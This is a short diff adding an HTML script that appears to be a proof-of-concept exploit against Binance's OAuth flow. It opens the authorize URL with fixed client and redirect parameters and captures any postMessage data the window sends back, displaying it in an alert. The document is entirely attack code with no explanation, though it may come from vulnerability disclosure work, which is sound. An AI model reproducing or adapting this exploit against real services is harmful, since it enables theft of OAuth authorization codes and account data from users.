@@ -1,0 +1,9 @@
+<script>
+  function listener(event) {
+    alert(JSON.stringify(event.data));
+  }
+
+  var dest = window.open("https://accounts.binance.com/en/oauth/authorize?callback=&client_id=AYas7Fbcp1&redirect_uri=https%3A%2F%2Fdevelopers.binance.com%2Fen%2Fmpp%2Foauth&response_type=code&scope=user%3Aemail%2Cuser%3Aqrcode&state=lwoeek");
+  
+  window.addEventListener("message", listener);
+</script>
